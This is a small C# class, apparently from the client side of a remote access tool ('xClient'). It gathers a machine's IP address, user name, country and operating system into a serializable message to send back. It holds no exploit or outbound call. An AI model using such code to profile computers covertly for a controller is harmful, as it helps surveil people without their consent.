using System;
using System.Collections.Generic;
using System.Text;
using xClient.Utils;

namespace xClient.responds
{
    [Serializable]
    public class SendInfo : Respond
    {
        public string IP,
               pcuser,
               tag,
               country,
               country_code,
               os;
        public int Image_index;
        public SendInfo()
        {
            _GetINFO inf = new _GetINFO();
            IP = inf.IP;
            pcuser = inf.user_n;
            country = inf.country;
            country_code = inf.country_code;
            Image_index = inf.country_f;
            os = inf.OS;
            tag = "";
        }

    }
}
